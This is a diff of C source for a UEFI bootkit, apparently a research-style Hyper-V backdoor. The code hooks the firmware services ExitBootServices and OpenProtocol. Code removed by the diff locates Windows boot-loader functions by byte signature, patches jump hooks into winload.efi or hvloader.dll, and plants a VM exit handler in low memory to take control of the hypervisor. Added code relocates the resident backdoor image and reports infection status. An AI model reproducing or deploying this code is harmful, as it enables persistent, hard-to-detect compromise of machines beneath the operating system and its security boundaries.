-    Status = m_BS->GetMemoryMap(&MapSize, MapList, &MapKey, &DescriptorSize, &DescriptorVersion);
-    if (Status == EFI_SUCCESS)
-    {
-        UINTN i = 0;
-        EFI_MEMORY_DESCRIPTOR *MapEntry = MapList;
-
-        for (i = 0; i < MapSize / DescriptorSize; i += 1)
-        {            
-            UINTN Len = MapEntry->NumberOfPages * PAGE_SIZE;
-            VOID *Image = NULL;
-
-            // find PE images loaded by bootloader
-            if ((Image = FindLoadedImageInRange(ImageName, (VOID *)MapEntry->PhysicalStart, Len)) != NULL)
-            {
-                // image was found
-                return Image;
             }
-
-            // go to the next entry
-            MapEntry = (EFI_MEMORY_DESCRIPTOR *)((UINT8 *)MapEntry + DescriptorSize);
         }
     }
-    else
-    {
-        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
-    }
 
-    m_BS->FreePool((VOID *)MapList);
-
-    return NULL;
+    // exit to the original function
+    return old_OpenProtocol(Handle, Protocol, Interface, AgentHandle, ControllerHandle, Attributes);
 }
-//--------------------------------------------------------------------------------------
-#define WINLOAD_HOOK_SIZE JUMP32_LEN
 
+//--------------------------------------------------------------------------------------
 // original address of hooked function
 EFI_EXIT_BOOT_SERVICES old_ExitBootServices = NULL;
 
 // return address to ExitBootServices() caller
-VOID *ret_ExitBootServices = NULL;
-
-void PatchBelow1MbPageAddr(UINT8 *Buff, UINTN BuffSize, VOID *Value)
-{
-    UINTN i = 0;
-
-    for (i = 0; i < BuffSize - sizeof(UINT64); i += 1)
-    {
-        UINT64 Val = *(UINT64 *)(Buff + i);
-
-        // check for magic value
-        if ((Val & 0xfffffffffffff000) == BELOW_1MB_PAGE_MAGIC)
-        {
-            Val = (UINT64)Value + (Val & 0xfff);
-
-            // update HvlpBelow1MbPage value
-            *(UINT64 *)(Buff + i) = Val;
-        }
-    }
-}
-
-UINT8 *FindHvlpTransferToHypervisor(VOID *Addr, UINTN Len)
-{
-    UINTN i = 0;
-
-    for (i = 0; i < Len; i += 1) 
-    {
-        UINT8 *Func = RVATOVA(Addr, i);
-
-        /*
-            Match winload!HvlpTransferToHypervisor() code signature:
-
-                .text:0000000140109270      push    rbx
-                .text:0000000140109272      push    rbp
-                .text:0000000140109273      push    rsi
-                .text:0000000140109274      push    rdi
-                .text:0000000140109275      push    r12
-                .text:0000000140109277      push    r13
-                .text:0000000140109279      push    r14
-                .text:000000014010927B      push    r15
-                .text:000000014010927D      mov     cs:HvlpSavedRsp, rsp
-                .text:0000000140109284      jmp     r8
-
-        */
-        if (*(Func + 0x00) == 0x48 && *(Func + 0x01) == 0x53 && /* push rbx */
-            *(Func + 0x02) == 0x55 && *(Func + 0x03) == 0x56 && /* push rbp && push rsi */
-            *(Func + 0x0d) == 0x48 && *(Func + 0x0e) == 0x89 && *(Func + 0x0f) == 0x25 && /* mov HvlpSavedRsp, rsp */
-            *(Func + 0x14) == 0x41 && *(Func + 0x15) == 0xff && *(Func + 0x16) == 0xe0) /* jmp r8 */
-            
-        {
-            return Func;         
-        }
-    }
-
-    return NULL;
-}
-
-UINT8 *FindHvlpLowMemoryStub(VOID *Addr, UINTN Len)
-{
-    UINTN i = 0;
-
-    for (i = 0; i < Len; i += 1) 
-    {
-        UINT8 *Func = RVATOVA(Addr, i);
-
-        /*
-            Match winload!HvlpLowMemoryStub() code signature:
-
-                .text:0000000140109260      mov     cr3, rcx
-                .text:0000000140109263      jmp     rdx
-
-        */
-        if (*(Func + 0x00) == 0x0f && *(Func + 0x01) == 0x22 && *(Func + 0x02) == 0xd9 && /* mov cr3, rcx */
-            *(Func + 0x03) == 0xff && *(Func + 0x04) == 0xe2) /* jmp rdx */
-        {
-            return Func;         
-        }
-    }
-
-    return NULL;
-}
+UINT64 ret_ExitBootServices = 0;
 
 EFI_STATUS EFIAPI new_ExitBootServices(
     EFI_HANDLE ImageHandle,
     UINTN Key)
 {    
-    UINT32 DescriptorVersion = 0;
-    UINTN i = 0, MapSize = 0, DescriptorSize = 0;    
-    EFI_IMAGE_NT_HEADERS *pHeaders = NULL;    
-    EFI_STATUS Status = EFI_SUCCESS;
+    PHYPER_V_INFO pHvInfo = (PHYPER_V_INFO)(HYPER_V_INFO_ADDR);
 
-    VOID **HvlpBelow1MbPage = NULL;
-    UINT8 *HvlpBelow1MbPageAllocated = NULL;    
+    DbgMsg(__FILE__, __LINE__, __FUNCTION__"() called\r\n");    
 
-#ifdef USE_TRANSFER_TO_HYPERVISOR_HOOK
-
-    UINT8 *HvlpTransferToHypervisor = NULL;                                 
-
-#else
-
-    UINT8 *HvlpLowMemoryStub = NULL;
-
-#endif
-
-    HV_INFO *HvInfo = (HV_INFO *)HV_INFO_ADDR;
-
-    // return address points to winload
-    VOID *Base = NULL, *Addr = (VOID *)((UINTN)ret_ExitBootServices & 0xfffffffffffff000);
-
-    // determinate winload.efi base address
-    while (i < PAGE_SIZE * 0x20)
+    switch (m_HvInfo.Status)
     {
-        if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
-        {
-            Base = Addr;
-            break;
-        }
+    case BACKDOOR_ERR_WINLOAD_IMAGE:
 
-        Addr = (VOID *)((UINTN)Addr - PAGE_SIZE);
-        i += PAGE_SIZE;
-    }    
+        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload.efi\r\n");
+        break;
 
-    if (Base == NULL)
-    {
-        HvInfo->Success = BACKDOOR_ERR_WINLOAD;
-        goto _end;
-    }    
+    case BACKDOOR_ERR_WINLOAD_FUNC:
 
-    pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, ((EFI_IMAGE_DOS_HEADER *)Base)->e_lfanew);
+        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!BlLdrLoadImage()\r\n");
+        break;
 
-    for (i = 0; i < pHeaders->OptionalHeader.SizeOfImage; i += 1) 
-    {
-        UINT8 *Code = RVATOVA(Base, i);
+    case BACKDOOR_ERR_WINLOAD_HOOK:
 
-        /*
-            Match winload!HvlpLaunchHvLoader() code signature:
+        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to hook winload!BlLdrLoadImage()\r\n");
+        break;
 
-                .text:000000014000F307      mov     cs:HvlpBelow1MbPageAllocated, al
-                .text:000000014000F30D      mov     rax, [rdi+10h]
-                .text:000000014000F311      mov     cs:HvlpBelow1MbPage, rax
-                .text:000000014000F318      mov     [rsp+0C8h+var_A8], r13d
-                .text:000000014000F31D      call    BlMmMapPhysicalAddressEx
+    case BACKDOOR_ERR_HYPER_V_IMAGE:
 
-        */
-        if (*(UINT32 *)(Code + 0x06) == 0x10478b48 && /* mov rax, [rdi+10h] */
-            *(Code + 0x00) == 0x88 && *(Code + 0x01) == 0x05 && /* mov HvlpBelow1MbPageAllocated, al */            
-            *(Code + 0x0a) == 0x48 && *(Code + 0x0b) == 0x89 && *(Code + 0x0c) == 0x05 && /* mov HvlpBelow1MbPage, rax */
-            *(Code + 0x11) == 0x44 && *(Code + 0x12) == 0x89 && /* mov [rsp+XX], r13d */
-            *(Code + 0x16) == 0xe8) /* call BlMmMapPhysicalAddressEx */
-        {
-            // get mov instructions operands
-            HvlpBelow1MbPage = (VOID **)((UINTN)(Code + 0x11) + *(INT32 *)(Code + 0x0d));
-            HvlpBelow1MbPageAllocated = (UINT8 *)((UINTN)(Code + 0x06) + *(INT32 *)(Code + 0x02));
-            break;
-        }
+        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate Hyper-V image\r\n");
+        break;
 
-        /*
-            Match winload!VlpPropagateHvlReturnData() code signature:
+    case BACKDOOR_ERR_HYPER_V_EXIT:
 
-                .text:00000001800192B4      mov     rax, [rdx+28h]
-                .text:00000001800192B8      mov     cs:HvlpBelow1MbPage, rax
-                .text:00000001800192BF      mov     al, [rdx+30h]
-                .text:00000001800192C2      add     rdx, 38h
-                .text:00000001800192C6      mov     cs:HvlpBelow1MbPageAllocated, al
-                .text:00000001800192CC      call    HvlpAddOnDebugBootOptions
-        */
-        else if (*(UINT32 *)Code == 0x28428b48 && /* mov rax, [rdx+28h] */
-                 *(Code + 0x04) == 0x48 && *(Code + 0x05) == 0x89 && *(Code + 0x06) == 0x05 && /* mov HvlpBelow1MbPage, rax */
-                 *(Code + 0x0e) == 0x48 && *(Code + 0x0f) == 0x83 && *(Code + 0x10) == 0xc2 && *(Code + 0x11) == 0x38 && /* add rdx, 38h */
-                 *(Code + 0x12) == 0x88 && *(Code + 0x13) == 0x05 && /* mov HvlpBelow1MbPageAllocated, al */            
-                 *(Code + 0x18) == 0xe8) /* call HvlpAddOnDebugBootOptions */
-        {
-            // get mov instructions operands
-            HvlpBelow1MbPage = (VOID **)((UINTN)(Code + 0x0b) + *(INT32 *)(Code + 0x07));
-            HvlpBelow1MbPageAllocated = (UINT8 *)((UINTN)(Code + 0x18) + *(INT32 *)(Code + 0x14));
-            break;
-        }
+        DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate Hyper-V VM exit handler\r\n");
+        break;
+
+    case BACKDOOR_ERR_UNKNOWN:
+
+        DbgMsg(__FILE__, __LINE__, "ERROR: Unknown error occurred\r\n");
+        break;
     }
 
-    if (HvlpBelow1MbPage == NULL || HvlpBelow1MbPageAllocated == NULL)
-    {
-        HvInfo->Success = BACKDOOR_ERR_BELOW_1MB_NOT_FOUND;
-        goto _end;
-    }
+    // prevent to call DXE services during runtime phase
+    m_TextOutput = NULL;
 
-    if (*HvlpBelow1MbPageAllocated == 0)
-    {
-        HvInfo->Success = BACKDOOR_ERR_BELOW_1MB_NOT_ALLOCATED;
-        goto _end;
-    }
-
-    DbgMsg(__FILE__, __LINE__, "winload.efi is at "FPTR"\r\n", Base);    
-
-    DbgMsg(__FILE__, __LINE__, __FUNCTION__"(): Return address is "FPTR"\r\n", ret_ExitBootServices);
-
-    DbgMsg(
-        __FILE__, __LINE__, "winload!HvlpBelow1MbPage is at "FPTR" (value = "FPTR")\r\n", 
-        HvlpBelow1MbPage, *HvlpBelow1MbPage
-    );
-
-    DbgMsg(
-        __FILE__, __LINE__, "winload!HvlpBelow1MbPageAllocated is at "FPTR" (value = %d)\r\n", 
-        HvlpBelow1MbPageAllocated, *HvlpBelow1MbPageAllocated
-    );    
-
-#ifdef USE_TRANSFER_TO_HYPERVISOR_HOOK
-
-    /*
-        Patch winload!HvlpTransferToHypervisor() to gain execution during hypervisor load
-    */
-
-    // find winload!HvlpTransferToHypervisor()
-    if (HvlpTransferToHypervisor = FindHvlpTransferToHypervisor(Base, pHeaders->OptionalHeader.SizeOfImage))
-    {
-        UINT8 *Below1MbPage = (UINT8 *)*HvlpBelow1MbPage;
-        UINTN CodeSize = 0;
-
-        // use HvlpBelow1MbPage + 0x10 to store hook handler code
-        UINT8 *Buff = Below1MbPage + 0x10;
-        UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + (JUMP32_LEN * 2) + 16;
-
-        UINT8 *VmExitCode = Below1MbPage + VM_EXIT_HANDLER_CODE;
-        VM_EXIT_INFO *VmExitInfo = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
-        
-        DbgMsg(__FILE__, __LINE__, "winload!HvlpTransferToHypervisor is at "FPTR"\r\n", HvlpTransferToHypervisor);
-
-        CodeSize = (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler;
-
-        // copy VM exit handler code to HvlpBelow1MbPage
-        m_BS->CopyMem(VmExitCode, (VOID *)&VMExitHandler, CodeSize);
-
-        // patch HvlpBelow1MbPage value in VMExitHandler() code
-        PatchBelow1MbPageAddr(VmExitCode, CodeSize, Below1MbPage);
-
-        // clear VM exit handler info
-        VmExitInfo->Flags = 0;
-        VmExitInfo->VmExitCounter = 0;
-
-        m_BS->SetMem(&VmExitInfo->EptList, EPT_MAX_COUNT * sizeof(EPT_INFO), 0xff);
-
-        // get new_HvlpTransferToHypervisor() code size
-        CodeSize = (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor;
-
-        // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
-        m_BS->CopyMem(Handler, (VOID *)&new_HvlpTransferToHypervisor, CodeSize);
-
-        // patch HvlpBelow1MbPage value in new_HvlpTransferToHypervisor() code
-        PatchBelow1MbPageAddr(Handler, CodeSize, Below1MbPage);
-
-        // push rcx / push rdx / push r8
-        *(UINT32 *)Buff = 0x50415251;
-
-        // push rbx / push rdi / push rsi
-        *(UINT32 *)(Buff + 4) = 0x90565753;
-
-        // call new_HvlpTransferToHypervisor
-        *(Buff + 8) = 0xe8;
-        *(UINT32 *)(Buff + 9) = JUMP32_OP(Buff + 8, Handler);
-
-        // pop rsi / pop rdi / pop rbx
-        *(UINT32 *)(Buff + JUMP32_LEN + 8) = 0x905b5f5e;
-
-        // pop r8 / pop rdx / pop rcx
-        *(UINT32 *)(Buff + JUMP32_LEN + 12) = 0x595a5841;
-
-        // save original bytes
-        m_BS->CopyMem(Buff + JUMP32_LEN + 16, HvlpTransferToHypervisor, WINLOAD_HOOK_SIZE);
-
-        // jmp addr ; from callgate to function
-        *(UINT8 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE) = 0xe9;
-        *(UINT32 *)(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE + 1) = \
-            JUMP32_OP(Buff + JUMP32_LEN + 16 + WINLOAD_HOOK_SIZE, HvlpTransferToHypervisor + WINLOAD_HOOK_SIZE);
-
-        // jmp HvlpBelow1MbPage + 0x10
-        *HvlpTransferToHypervisor = 0xe9;
-        *(UINT32 *)(HvlpTransferToHypervisor + 1) = JUMP32_OP(HvlpTransferToHypervisor, Buff);            
-
-        DbgMsg(
-            __FILE__, __LINE__, 
-            "winload!HvlpTransferToHypervisor() hook was set (handler = "FPTR")\r\n",
-            Buff
-        );
-
-        goto _end;
-    }
-
-    DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpTransferToHypervisor()\r\n");
-
-    HvInfo->Success = BACKDOOR_ERR_TRANSFER_TO_HYPERVISOR;
-
-#else // USE_TRANSFER_TO_HYPERVISOR_HOOK
-
-    /*
-        Patch winload!HvlpLowMemoryStub() or hvloader!HvlpLowMemoryStub() to gain execution during hypervisor load
-    */
-
-    // find winload!HvlpLowMemoryStub()
-    if ((HvlpLowMemoryStub = FindHvlpLowMemoryStub(Base, pHeaders->OptionalHeader.SizeOfImage)) == NULL)
-    {
-        VOID *HvLoader = FindLoadedImage("hvloader.dll");
-        if (HvLoader)
-        {
-            pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(HvLoader, ((EFI_IMAGE_DOS_HEADER *)HvLoader)->e_lfanew);
-
-            DbgMsg(__FILE__, __LINE__, "hvloader.dll is at "FPTR"\r\n", HvLoader);    
-
-            // find hvloader!HvlpLowMemoryStub()
-            HvlpLowMemoryStub = FindHvlpLowMemoryStub(HvLoader, pHeaders->OptionalHeader.SizeOfImage);
-        }
-        else
-        {
-            DbgMsg(__FILE__, __LINE__, "Unable to locate hvloader.dll\r\n");       
-        }
-    }
-
-    if (HvlpLowMemoryStub)
-    {
-        UINT8 *Below1MbPage = (UINT8 *)*HvlpBelow1MbPage;
-        UINTN CodeSize = 0;
-
-        // use HvlpBelow1MbPage + 0x10 to store hook handler code
-        UINT8 *Buff = Below1MbPage + 0x10;
-        UINT8 *Handler = Buff + WINLOAD_HOOK_SIZE + JUMP32_LEN + 21;
-
-        UINT8 *VmExitCode = Below1MbPage + VM_EXIT_HANDLER_CODE;
-        VM_EXIT_INFO *VmExitInfo = (VM_EXIT_INFO *)(Below1MbPage + VM_EXIT_HANDLER_INFO);
-        
-        DbgMsg(__FILE__, __LINE__, "winload!HvlpLowMemoryStub is at "FPTR"\r\n", HvlpLowMemoryStub);
-
-        CodeSize = (UINTN)&VMExitHandler_end - (UINTN)&VMExitHandler;
-
-        // copy VM exit handler code to HvlpBelow1MbPage
-        m_BS->CopyMem(VmExitCode, (VOID *)&VMExitHandler, CodeSize);
-
-        // patch HvlpBelow1MbPage value in VMExitHandler() code
-        PatchBelow1MbPageAddr(VmExitCode, CodeSize, Below1MbPage);
-
-        // clear VM exit handler info
-        VmExitInfo->Flags = 0;
-        VmExitInfo->VmExitCounter = 0;
-
-        m_BS->SetMem(&VmExitInfo->EptList, EPT_MAX_COUNT * sizeof(EPT_INFO), 0xff);
-
-        // get new_HvlpTransferToHypervisor() code size
-        CodeSize = (UINTN)&new_HvlpTransferToHypervisor_end - (UINTN)&new_HvlpTransferToHypervisor;
-
-        // copy HvlpTransferToHypervisor() handler code to HvlpBelow1MbPage
-        m_BS->CopyMem(Handler, (VOID *)&new_HvlpTransferToHypervisor, CodeSize);
-
-        // patch HvlpBelow1MbPage value in new_HvlpTransferToHypervisor() code
-        PatchBelow1MbPageAddr(Handler, CodeSize, Below1MbPage);
-
-        // push rcx / push rdx / push r8
-        *(UINT32 *)Buff = 0x50415251;
-
-        // push rbx / push rdi / push rsi
-        *(UINT32 *)(Buff + 4) = 0x90565753;
-
-        // call new_HvlpTransferToHypervisor
-        *(Buff + 8) = 0xe8;
-        *(UINT32 *)(Buff + 9) = JUMP32_OP(Buff + 8, Handler);
-
-        // pop rsi / pop rdi / pop rbx
-        *(UINT32 *)(Buff + JUMP32_LEN + 8) = 0x905b5f5e;
-
-        // pop r8 / pop rdx / pop rcx
-        *(UINT32 *)(Buff + JUMP32_LEN + 12) = 0x595a5841;
-
-        // mov cr3, rcx
-        *(UINT32 *)(Buff + JUMP32_LEN + 16) = 0xd9220f90;
-
-        // jmp rdx
-        *(UINT16 *)(Buff + JUMP32_LEN + 20) = 0xe2ff;
-
-        // jmp $ + 0x10
-        *HvlpLowMemoryStub = 0xe9;
-        *(UINT32 *)(HvlpLowMemoryStub + 1) = JUMP32_OP(Below1MbPage, Buff);            
-
-        DbgMsg(
-            __FILE__, __LINE__, 
-            "winload!HvlpLowMemoryStub() hook was set (handler = "FPTR")\r\n",
-            Buff
-        );
-
-        goto _end;
-    }
-
-    DbgMsg(__FILE__, __LINE__, "ERROR: Unable to locate winload!HvlpLowMemoryStub()\r\n");
-
-    HvInfo->Success = BACKDOOR_ERR_LOW_MEMORY_STUB;
-
-#endif // USE_TRANSFER_TO_HYPERVISOR_HOOK
-
-_end:
-
-    Status = m_BS->GetMemoryMap(&MapSize, NULL, &Key, &DescriptorSize, &DescriptorVersion);
-    if (Status != EFI_BUFFER_TOO_SMALL)
-    {
-        DbgMsg(__FILE__, __LINE__, "GetMemoryMap() ERROR 0x%x\r\n", Status);
-    }
+    // report Hyper-V information
+    std_memcpy(pHvInfo, &m_HvInfo, sizeof(HYPER_V_INFO));
 
     // exit to the original function
     return old_ExitBootServices(ImageHandle, Key);
@@ -1053,23 +583,85 @@ _end:
 //--------------------------------------------------------------------------------------
 typedef VOID (* BACKDOOR_ENTRY_RESIDENT)(VOID *Image);
 
+EFI_STATUS RegisterProtocolNotifyDxe(
+    EFI_GUID *Guid, EFI_EVENT_NOTIFY Handler,
+    EFI_EVENT *Event, VOID **Registration)
+{
+    EFI_STATUS Status = m_BS->CreateEvent(EVT_NOTIFY_SIGNAL, TPL_CALLBACK, Handler, NULL, Event);
+    if (EFI_ERROR(Status)) 
+    {
+        DbgMsg(__FILE__, __LINE__, "CreateEvent() fails: 0x%X\r\n", Status);
+        return Status;
+    }
+
+    Status = m_BS->RegisterProtocolNotify(Guid, *Event, Registration);
+    if (EFI_ERROR(Status)) 
+    {
+        DbgMsg(__FILE__, __LINE__, "RegisterProtocolNotify() fails: 0x%X\r\n", Status);
+        return Status;
+    }
+
+    DbgMsg(__FILE__, __LINE__, "Protocol notify handler is at "FPTR"\r\n", Handler);
+
+    return Status;
+}
+
 VOID BackdoorEntryResident(VOID *Image)
-{   
+{               
+    PHYPER_V_INFO pHvInfo = (PHYPER_V_INFO)(HYPER_V_INFO_ADDR);
+    PINFECTOR_STATUS pInfectorStatus = (PINFECTOR_STATUS)(INFECTOR_STATUS_ADDR);    
+
+#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)
+
+    VOID *Registration = NULL;
+    EFI_EVENT Event = NULL;  
+
+    // set text output protocol register notify
+    RegisterProtocolNotifyDxe(
+        &gEfiSimpleTextOutProtocolGuid, SimpleTextOutProtocolNotifyHandler,
+        &Event, &Registration
+    );
+
+#endif
+
     m_ImageBase = Image;        
 
     DbgMsg(__FILE__, __LINE__, __FUNCTION__"()\r\n");
 
+    // hook EFI_BOOT_SERVICES.OpenProtocol()
+    old_OpenProtocol = m_BS->OpenProtocol;
+    m_BS->OpenProtocol = _OpenProtocol;
+
     // hook EFI_BOOT_SERVICES.ExitBootServices()
     old_ExitBootServices = m_BS->ExitBootServices;
-    m_BS->ExitBootServices = _ExitBootServices;
+    m_BS->ExitBootServices = _ExitBootServices;        
 
     DbgMsg(
-        __FILE__, __LINE__, 
-        "EFI_BOOT_SERVICES.ExitBootServices() hook was set (handler = "FPTR")\r\n",
+        __FILE__, __LINE__, "OpenProtocol() hook was set, handler = "FPTR"\r\n",
+        _OpenProtocol
+    );
+
+    DbgMsg(
+        __FILE__, __LINE__, "ExitBootServices() hook was set, handler = "FPTR"\r\n",
         _ExitBootServices
     );
 
-    m_InfectorStatus->Success += 1;
+    m_HvInfo.Status = BACKDOOR_ERR_WINLOAD_IMAGE;
+    m_HvInfo.ImageBase = NULL;
+    m_HvInfo.ImageEntry = NULL;
+    m_HvInfo.VmExit = NULL;
+
+    pHvInfo->Status = BACKDOOR_NOT_READY;
+
+    // notify about successful DXE driver execution
+    pInfectorStatus->Status = BACKDOOR_SUCCESS;
+
+#if !defined(BACKDOOR_DEBUG_SCREEN)
+
+    m_TextOutput = NULL;
+
+#endif
+
 }
 //--------------------------------------------------------------------------------------
 EFI_STATUS
@@ -1112,32 +704,20 @@ EFIAPI
 _ModuleEntryPoint(
     EFI_HANDLE ImageHandle,
     EFI_SYSTEM_TABLE *SystemTable) 
-{
-    EFI_STATUS Status = EFI_SUCCESS;    
-    VOID *Image = NULL;
-
+{    
+    m_ST = SystemTable;
     m_BS = SystemTable->BootServices;
 
+#if defined(BACKDOOR_DEBUG)
 #if defined(BACKDOOR_DEBUG_SERIAL)
 
     // initialize serial port I/O for debug messages
     SerialPortInitialize(SERIAL_PORT_NUM, SERIAL_BAUDRATE);
 
-#endif        
+#endif
 
-#if defined(BACKDOOR_DEBUG)
-
-    // initialize console I/O
-    Status = m_BS->HandleProtocol(
-        SystemTable->ConsoleOutHandle,
-        &gEfiSimpleTextOutProtocolGuid, 
-        (VOID **)&m_TextOutput
-    );
-    if (Status == EFI_SUCCESS)
-    {
-        m_TextOutput->SetAttribute(m_TextOutput, EFI_TEXT_ATTR(EFI_WHITE, EFI_RED));
-        m_TextOutput->ClearScreen(m_TextOutput);
-    }
+    // initialize text output
+    ConsoleInitialize();
 
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
@@ -1145,28 +725,47 @@ _ModuleEntryPoint(
     DbgMsg(__FILE__, __LINE__, "                              \r\n");
     DbgMsg(__FILE__, __LINE__, "******************************\r\n");
 
-    DbgMsg(
-        __FILE__, __LINE__, "Image address is "FPTR"\r\n", 
-        m_ImageBase
-    );
+#endif
 
-#endif // BACKDOOR_DEBUG    
+    if (ImageHandle && m_ImageBase == NULL)
+    {        
+        EFI_LOADED_IMAGE *LoadedImage = NULL;
 
-    // copy image to the new location
-    if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
+        // bootkit was loaded as EFI application
+        EFI_STATUS Status = m_BS->HandleProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, (VOID **)&LoadedImage);      
+        if (Status == EFI_SUCCESS)
+        {
+            // get current image base
+            m_ImageBase = LoadedImage->ImageBase;
+        }
+        else
+        {
+            DbgMsg(__FILE__, __LINE__, "HandleProtocol() fails: 0x%X\r\n", Status);
+        }
+    }
+
+    if (m_ImageBase)
     {
-        BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
-            Image,
-            (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
-        );
-        
-        DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
-        
-        // initialize backdoor resident code
-        pEntry(Image);
-    } 
+        VOID *Image = NULL;
 
-#if defined(BACKDOOR_DEBUG)
+        DbgMsg(__FILE__, __LINE__, "Image address is "FPTR"\r\n", m_ImageBase);
+
+        // copy image to the new location
+        if ((Image = BackdoorImageRealocate(m_ImageBase)) != NULL)
+        {
+            BACKDOOR_ENTRY_RESIDENT pEntry = (BACKDOOR_ENTRY_RESIDENT)RVATOVA(
+                Image,
+                (UINT8 *)BackdoorEntryResident - (UINT8 *)m_ImageBase
+            );
+            
+            DbgMsg(__FILE__, __LINE__, "Resident code base address is "FPTR"\r\n", Image);
+            
+            // initialize backdoor resident code
+            pEntry(Image);
+        } 
+    }
+
+#if defined(BACKDOOR_DEBUG) && defined(BACKDOOR_DEBUG_SPLASH)
 
     m_BS->Stall(TO_MICROSECONDS(3));
 
@@ -1176,4 +775,3 @@ _ModuleEntryPoint(
 }
 //--------------------------------------------------------------------------------------
 // EoF
-
